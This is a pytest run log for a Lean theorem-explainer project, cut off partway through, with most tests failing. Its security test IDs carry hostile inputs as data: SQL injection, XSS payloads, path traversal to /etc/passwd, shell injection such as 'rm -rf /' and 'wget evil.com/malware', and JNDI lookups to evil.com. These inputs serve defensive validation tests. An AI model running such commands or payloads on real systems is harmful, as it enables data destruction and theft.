============================= test session starts ==============================
platform darwin -- Python 3.12.9, pytest-8.4.1, pluggy-1.6.0 -- /Users/brightliu/miniconda3/envs/cs109b/bin/python
cachedir: .pytest_cache
benchmark: 5.1.0 (defaults: timer=time.perf_counter disable_gc=False min_rounds=5 min_time=0.000005 max_time=1.0 calibration_precision=10 warmup=False warmup_iterations=100000)
hypothesis profile 'default'
rootdir: /Users/brightliu/Coding_Projects/proof-sketcher
configfile: pytest.ini
testpaths: tests
plugins: xdist-3.7.0, anyio-4.9.0, Faker-37.4.0, cov-4.1.0, mock-3.14.1, benchmark-5.1.0, asyncio-1.0.0, hypothesis-6.135.20
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function
collecting ... collected 292 items

tests/integration/test_end_to_end.py::TestSimpleTheoremPipeline::test_simple_theorem_full_pipeline FAILED [  0%]
tests/integration/test_end_to_end.py::TestSimpleTheoremPipeline::test_offline_mode_pipeline FAILED [  0%]
tests/integration/test_end_to_end.py::TestMathlibTheoremPipeline::test_mathlib_theorem_pipeline FAILED [  1%]
tests/integration/test_end_to_end.py::TestBatchProcessing::test_batch_processing FAILED [  1%]
tests/integration/test_end_to_end.py::TestErrorRecovery::test_error_recovery FAILED [  1%]
tests/integration/test_end_to_end.py::TestErrorRecovery::test_timeout_handling FAILED [  2%]
tests/integration/test_end_to_end.py::TestErrorRecovery::test_memory_limit_handling FAILED [  2%]
tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_single_theorem_performance FAILED [  2%]
tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_batch_performance FAILED [  3%]
tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_cache_effectiveness FAILED [  3%]
tests/integration/test_full_pipeline.py::TestFullPipeline::test_parse_generate_export_pipeline ERROR [  3%]
tests/integration/test_full_pipeline.py::TestFullPipeline::test_async_animation_pipeline ERROR [  4%]
tests/integration/test_full_pipeline.py::TestFullPipeline::test_batch_processing_pipeline FAILED [  4%]
tests/integration/test_full_pipeline.py::TestFullPipeline::test_error_handling_pipeline FAILED [  4%]
tests/integration/test_full_pipeline.py::TestFullPipeline::test_configuration_pipeline FAILED [  5%]
tests/integration/test_full_pipeline.py::TestCLIIntegration::test_cli_prove_command FAILED [  5%]
tests/integration/test_full_pipeline.py::TestCLIIntegration::test_cli_batch_command FAILED [  5%]
tests/integration/test_full_pipeline.py::TestCacheIntegration::test_generation_cache_integration FAILED [  6%]
tests/integration/test_full_pipeline.py::TestCacheIntegration::test_export_cache_integration FAILED [  6%]
tests/integration/test_full_pipeline.py::TestResourceManagement::test_memory_limits_pipeline FAILED [  6%]
tests/integration/test_full_pipeline.py::TestResourceManagement::test_temp_file_cleanup FAILED [  7%]
tests/integration/test_full_pipeline.py::TestPerformanceIntegration::test_parallel_processing_performance FAILED [  7%]
tests/integration/test_full_pipeline.py::TestPerformanceIntegration::test_notation_optimization_performance FAILED [  7%]
tests/integration/test_full_pipeline.py::TestMathlibIntegration::test_mathlib_notation_handling FAILED [  8%]
tests/integration/test_full_pipeline.py::TestMathlibIntegration::test_mathlib_proof_structure PASSED [  8%]
tests/integration/test_mathlib_real.py::TestParserConfig::test_basic_notation_conversion FAILED [  8%]
tests/integration/test_mathlib_real.py::TestParserConfig::test_complex_notation FAILED [  9%]
tests/integration/test_mathlib_real.py::TestParserConfig::test_notation_table_generation FAILED [  9%]
tests/integration/test_mathlib_real.py::TestParserConfig::test_mathematical_area_detection FAILED [  9%]
tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_mathlib_sketch_enhancement ERROR [ 10%]
tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_notation_table_generation ERROR [ 10%]
tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_complexity_assessment ERROR [ 10%]
tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_mathlib_export ERROR [ 11%]
tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_mathlib_style_project_scanning FAILED [ 11%]
tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_mathlib_notation_in_parsing PASSED [ 11%]
tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_end_to_end_mathlib_processing FAILED [ 12%]
tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_mathlib_batch_processing FAILED [ 12%]
tests/integration/test_mathlib_real.py::TestMathlibPerformance::test_notation_handler_performance FAILED [ 13%]
tests/integration/test_mathlib_real.py::TestMathlibPerformance::test_exporter_performance FAILED [ 13%]
tests/integration/test_mathlib_real.py::TestRealMathlibIntegration::test_real_mathlib_theorem_parsing SKIPPED [ 13%]
tests/integration/test_mathlib_real.py::TestRealMathlibIntegration::test_real_mathlib_batch_processing SKIPPED [ 14%]
tests/integration/test_mvp_pipeline.py::test_minimal_pipeline PASSED     [ 14%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_simple ERROR [ 14%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_induction ERROR [ 15%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_multiple ERROR [ 15%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_mathematical_context_generation ERROR [ 15%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_error_recovery ERROR [ 16%]
tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_caching_integration ERROR [ 16%]
tests/manual_tests/test_critical_error_handling.py::test_error_accumulation PASSED [ 16%]
tests/manual_tests/test_critical_error_handling.py::test_resource_limits FAILED [ 17%]
tests/manual_tests/test_critical_error_handling.py::test_error_context_propagation FAILED [ 17%]
tests/manual_tests/test_critical_error_handling.py::test_structured_logging PASSED [ 17%]
tests/manual_tests/test_critical_error_handling.py::test_file_parser_error_handling FAILED [ 18%]
tests/manual_tests/test_critical_error_handling.py::test_batch_error_recovery PASSED [ 18%]
tests/manual_tests/test_real_batch_errors.py::test_batch_export_with_failures PASSED [ 18%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data0] FAILED [ 19%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data1] FAILED [ 19%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data2] FAILED [ 19%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data3] FAILED [ 20%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data4] FAILED [ 20%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_empty_file PASSED [ 20%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_comment_only_file PASSED [ 21%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_multiple_theorems PASSED [ 21%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_malformed_theorem PASSED [ 21%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_theorem_with_imports PASSED [ 22%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_nonexistent_file PASSED [ 22%]
tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_non_lean_file PASSED [ 22%]
tests/parser/test_real_theorems.py::TestParserDiagnostics::test_basic_parsing_fallback FAILED [ 23%]
tests/parser/test_real_theorems.py::TestParserDiagnostics::test_debug_statement_extraction PASSED [ 23%]
tests/performance/test_benchmarks.py::test_performance_improvements FAILED [ 23%]
tests/performance/test_benchmarks.py::test_caching_effectiveness FAILED  [ 24%]
tests/performance/test_benchmarks.py::test_resource_limits_functionality FAILED [ 24%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_basic_directory_traversal PASSED [ 25%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_encoded_traversal PASSED [ 25%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_null_byte_injection PASSED [ 25%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_symlink_traversal PASSED [ 26%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_unicode_normalization_attack PASSED [ 26%]
tests/security/test_exploit_attempts.py::TestPathTraversalExploits::test_special_chars_in_path PASSED [ 26%]
tests/security/test_exploit_attempts.py::TestCommandInjectionExploits::test_shell_injection_in_executable PASSED [ 27%]
tests/security/test_exploit_attempts.py::TestCommandInjectionExploits::test_unicode_shell_bypass PASSED [ 27%]
tests/security/test_exploit_attempts.py::TestCommandInjectionExploits::test_subprocess_shell_disabled PASSED [ 27%]
tests/security/test_exploit_attempts.py::TestTheoremNameExploits::test_path_injection_in_theorem_name FAILED [ 28%]
tests/security/test_exploit_attempts.py::TestTheoremNameExploits::test_shell_chars_in_theorem_name PASSED [ 28%]
tests/security/test_exploit_attempts.py::TestTheoremNameExploits::test_xss_in_theorem_name PASSED [ 28%]
tests/security/test_exploit_attempts.py::TestResourceExhaustionExploits::test_memory_bomb PASSED [ 29%]
tests/security/test_exploit_attempts.py::TestResourceExhaustionExploits::test_timeout_prevention PASSED [ 29%]
tests/security/test_exploit_attempts.py::TestResourceExhaustionExploits::test_rate_limiting FAILED [ 29%]
tests/security/test_exploit_attempts.py::TestXSSPrevention::test_script_injection_in_content FAILED [ 30%]
tests/security/test_exploit_attempts.py::TestRaceConditionExploits::test_concurrent_file_access PASSED [ 30%]
tests/security/test_exploit_attempts.py::TestEdgeCaseExploits::test_extremely_long_paths PASSED [ 30%]
tests/security/test_exploit_attempts.py::TestEdgeCaseExploits::test_extremely_long_theorem_names PASSED [ 31%]
tests/security/test_exploit_attempts.py::TestEdgeCaseExploits::test_empty_and_whitespace PASSED [ 31%]
tests/security/test_exploit_attempts.py::TestEdgeCaseExploits::test_special_filesystem_names FAILED [ 31%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization['; DROP TABLE theorems; ---'; DROP TABLE theorems; --] FAILED [ 32%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[admin' OR '1'='1-admin' OR '1'='1] FAILED [ 32%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[1; DELETE FROM users-1; DELETE FROM users] FAILED [ 32%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[<script>alert('xss')</script>-&lt;script&gt;alert('xss')&lt;/script&gt;] FAILED [ 33%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[javascript:alert('xss')-javascript:alert('xss')] FAILED [ 33%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[<img src=x onerror=alert('xss')>-&lt;img src=x onerror=alert('xss')&gt;] FAILED [ 33%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[&lt;script&gt;alert('xss')&lt;/script&gt;-&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;] FAILED [ 34%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[../../../etc/passwd-../../../etc/passwd] FAILED [ 34%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[..\\..\\..\\windows\\system32-..\\..\\..\\windows\\system32] FAILED [ 34%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[/etc/passwd-/etc/passwd] FAILED [ 35%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean; rm -rf /-file.lean; rm -rf /] FAILED [ 35%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean && cat /etc/passwd-file.lean && cat /etc/passwd] FAILED [ 35%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean || wget evil.com/malware-file.lean || wget evil.com/malware] FAILED [ 36%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[`rm -rf /`-`rm -rf /`] FAILED [ 36%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[$(rm -rf /)-$(rm -rf /)] FAILED [ 36%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[${jndi:ldap://evil.com/a}-${jndi:ldap://evil.com/a}] FAILED [ 37%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[${jndi:rmi://evil.com/a}-${jndi:rmi://evil.com/a}] FAILED [ 37%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.txt\x00.exe-file.txt.exe] FAILED [ 38%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean\x00../../../etc/passwd-file.lean../../../etc/passwd] FAILED [ 38%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file\u200b.lean-file\u200b.lean] FAILED [ 38%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file\u2028.lean-file\u2028.lean] FAILED [ 39%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[theorem test : True := trivial-theorem test : True := trivial] FAILED [ 39%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[valid_theorem_name-valid_theorem_name] FAILED [ 39%]
tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[-] FAILED [ 40%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[../../../etc/passwd-False] FAILED [ 40%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[..\\..\\..\\windows\\system32-False] FAILED [ 40%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[/etc/passwd-False] FAILED [ 41%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean/../../../etc/passwd-False] FAILED [ 41%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean; rm -rf /-False] FAILED [ 41%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean && cat /etc/passwd-False] FAILED [ 42%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean || wget evil.com-False] FAILED [ 42%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean | grep secret-False] FAILED [ 42%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean `rm -rf /`-False] FAILED [ 43%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean $(rm -rf /)-False] FAILED [ 43%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean {rm -rf /}-False] FAILED [ 43%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean-True] FAILED [ 44%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[subdir/file.lean-True] FAILED [ 44%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[deep/nested/file.lean-True] FAILED [ 44%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file-with-dash.lean-True] FAILED [ 45%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file_with_underscore.lean-True] FAILED [ 45%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.with.dots.lean-True] FAILED [ 45%]
tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[-False] FAILED [ 46%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[valid_theorem-True] FAILED [ 46%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[theorem_with_numbers123-True] FAILED [ 46%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[theorem.with.dots-True] FAILED [ 47%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[_leading_underscore-True] FAILED [ 47%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[CamelCase-True] FAILED [ 47%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[simple-True] FAILED [ 48%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[-False] FAILED [ 48%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[123invalid-False] FAILED [ 48%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid-dash-False] FAILED [ 49%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid space-False] FAILED [ 49%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid@symbol-False] FAILED [ 50%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid/slash-False] FAILED [ 50%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid\\backslash-False] FAILED [ 50%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False] FAILED [ 51%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[.invalid-False] FAILED [ 51%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid.-False] FAILED [ 51%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid..double-False] FAILED [ 52%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[../../etc/passwd-False] FAILED [ 52%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[$(rm -rf /)-False] FAILED [ 52%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[`rm -rf /`-False] FAILED [ 53%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation['; DROP TABLE theorems; ---False] FAILED [ 53%]
tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[<script>alert('xss')</script>-False] FAILED [ 53%]
tests/security/test_input_validation.py::TestInputValidation::test_lean_code_sanitization FAILED [ 54%]
tests/security/test_input_validation.py::TestInputValidation::test_filename_sanitization FAILED [ 54%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://api.anthropic.com/v1/messages-False-True] FAILED [ 54%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com-False-True] FAILED [ 55%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://subdomain.example.com-False-True] FAILED [ 55%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[wss://websocket.example.com-False-True] FAILED [ 55%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://example.com-False-False] FAILED [ 56%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[ftp://example.com-False-False] FAILED [ 56%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[file:///etc/passwd-False-False] FAILED [ 56%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[javascript:alert('xss')-False-False] FAILED [ 57%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[data:text/html,<script>alert('xss')</script>-False-False] FAILED [ 57%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost:8000-True-True] FAILED [ 57%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://127.0.0.1:8000-True-True] FAILED [ 58%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost-True-True] FAILED [ 58%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost:8000-False-False] FAILED [ 58%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/../admin-False-False] FAILED [ 59%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/normal/path-False-True] FAILED [ 59%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[-False-False] FAILED [ 59%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[not-a-url-False-False] FAILED [ 60%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[://invalid-False-False] FAILED [ 60%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[//example.com-False-False] FAILED [ 60%]
tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False-True] FAILED [ 61%]
tests/security/test_input_validation.py::TestSecureConfiguration::test_api_key_validation FAILED [ 61%]
tests/security/test_input_validation.py::TestSecureConfiguration::test_session_id_generation FAILED [ 61%]
tests/security/test_input_validation.py::TestSecureConfiguration::test_nonce_generation FAILED [ 62%]
tests/security/test_input_validation.py::TestSecureConfiguration::test_security_headers FAILED [ 62%]
tests/security/test_input_validation.py::TestSecureConfiguration::test_environment_validation FAILED [ 63%]
tests/security/test_input_validation.py::TestSecurityBypass::test_no_eval_execution FAILED [ 63%]
tests/security/test_input_validation.py::TestSecurityBypass::test_no_file_system_access FAILED [ 63%]
tests/security/test_input_validation.py::TestSecurityBypass::test_no_network_access_bypass FAILED [ 64%]
tests/test_cli.py::TestCLI::test_cli_help PASSED                         [ 64%]
tests/test_cli.py::TestCLI::test_cli_version PASSED                      [ 64%]
tests/test_cli.py::TestCLI::test_cli_debug_mode FAILED                   [ 65%]
tests/test_cli.py::TestProveCommand::test_prove_basic FAILED             [ 65%]
tests/test_cli.py::TestProveCommand::test_prove_with_options FAILED      [ 65%]
tests/test_cli.py::TestProveCommand::test_prove_specific_theorem FAILED  [ 66%]
tests/test_cli.py::TestProveCommand::test_prove_error_handling FAILED    [ 66%]
tests/test_cli.py::TestConfigCommand::test_config_show FAILED            [ 66%]
tests/test_cli.py::TestConfigCommand::test_config_save FAILED            [ 67%]
tests/test_cli.py::TestCacheCommand::test_cache_status FAILED            [ 67%]
tests/test_cli.py::TestCacheCommand::test_cache_clear FAILED             [ 67%]
tests/test_cli.py::TestCacheCommand::test_cache_clear_specific_type FAILED [ 68%]
tests/test_cli.py::TestListCommand::test_list_theorems FAILED            [ 68%]
tests/test_cli.py::TestBatchProcessing::test_process_directory FAILED    [ 68%]
tests/test_cli.py::TestBatchProcessing::test_progress_bar FAILED         [ 69%]
tests/test_cli.py::TestCLIIntegration::test_full_pipeline_cli FAILED     [ 69%]
tests/test_cli.py::TestCLIIntegration::test_config_persistence FAILED    [ 69%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_processor_initialization PASSED [ 70%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_enhance_module_json_dict PASSED [ 70%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_enhance_module_json_string PASSED [ 70%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_enhance_declaration_theorem PASSED [ 71%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_enhance_declaration_non_theorem PASSED [ 71%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_get_educational_stats PASSED [ 71%]
tests/unit/test_docgen_plugin.py::TestModuleProcessor::test_batch_enhance_modules PASSED [ 72%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_generator_initialization PASSED [ 72%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_generate_content_from_docgen FAILED [ 72%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_create_theorem_info PASSED [ 73%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_extract_dependencies PASSED [ 73%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_extract_namespace PASSED [ 73%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_extract_tactics PASSED [ 74%]
tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_estimate_difficulty FAILED [ 74%]
tests/unit/test_docgen_plugin.py::TestEducationalTemplateEngine::test_engine_initialization PASSED [ 75%]
tests/unit/test_docgen_plugin.py::TestEducationalTemplateEngine::test_render_educational_declaration PASSED [ 75%]
tests/unit/test_docgen_plugin.py::TestEducationalTemplateEngine::test_create_educational_assets PASSED [ 75%]
tests/unit/test_docgen_plugin.py::TestEducationalTemplateEngine::test_template_creation PASSED [ 76%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_config_creation PASSED [ 76%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_facet_initialization PASSED [ 76%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_process_module_docs PASSED [ 77%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_process_nonexistent_module PASSED [ 77%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_process_all_modules PASSED [ 77%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_generate_educational_assets FAILED [ 78%]
tests/unit/test_docgen_plugin.py::TestLakeFacet::test_create_educational_index PASSED [ 78%]
tests/unit/test_exporters.py::TestBaseExporterBase::test_base_exporter_initialization PASSED [ 78%]
tests/unit/test_exporters.py::TestBaseExporterBase::test_base_exporter_setup_output_dir PASSED [ 79%]
tests/unit/test_exporters.py::TestHTMLExporter::test_html_exporter_initialization PASSED [ 79%]
tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_single FAILED [ 79%]
tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_with_animations FAILED [ 80%]
tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_batch FAILED [ 80%]
tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_exporter_initialization FAILED [ 80%]
tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_notation_enhancement FAILED [ 81%]
tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_complexity_assessment FAILED [ 81%]
tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_export_single FAILED [ 81%]
tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_exporter_initialization FAILED [ 82%]
tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_export_single FAILED [ 82%]
tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_notebook_structure FAILED [ 82%]
tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_with_code_cells FAILED [ 83%]
tests/unit/test_exporters.py::TestTemplateManager::test_template_manager_initialization FAILED [ 83%]
tests/unit/test_exporters.py::TestTemplateManager::test_render_html_template FAILED [ 83%]
tests/unit/test_exporters.py::TestTemplateManager::test_render_markdown_template FAILED [ 84%]
tests/unit/test_exporters.py::TestTemplateManager::test_template_context_helpers FAILED [ 84%]
tests/unit/test_exporters.py::TestTemplateManager::test_custom_template_filters FAILED [ 84%]
tests/unit/test_exporters.py::TestTemplateManager::test_template_not_found_handling FAILED [ 85%]
tests/unit/test_exporters.py::TestTemplateManager::test_template_inheritance FAILED [ 85%]
tests/unit/test_lsp_integration.py::test_lsp_client PASSED               [ 85%]
tests/unit/test_lsp_integration.py::test_hybrid_parser PASSED            [ 86%]
tests/unit/test_lsp_integration.py::test_backward_compatibility PASSED   [ 86%]
tests/unit/test_lsp_integration.py::test_educational_enhancement PASSED  [ 86%]
tests/unit/test_mathlib_integration.py::test_mathlib_theorem_parsing PASSED [ 87%]
tests/unit/test_mathlib_integration.py::test_educational_content_quality ERROR [ 87%]
tests/unit/test_mathlib_integration.py::test_export_pipeline_integration ERROR [ 88%]
tests/unit/test_mathlib_integration.py::test_performance_scalability PASSED [ 88%]
tests/unit/test_mathlib_integration.py::test_advanced_mathematical_features PASSED [ 88%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_parser_initialization PASSED [ 89%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_simple_file FAILED [ 89%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_file_with_errors FAILED [ 89%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_directory FAILED [ 90%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_dependency_extraction FAILED [ 90%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_tactic_extraction FAILED [ 90%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_namespace_handling FAILED [ 91%]
tests/unit/test_parsers.py::TestSimpleLeanParser::test_error_recovery FAILED [ 91%]
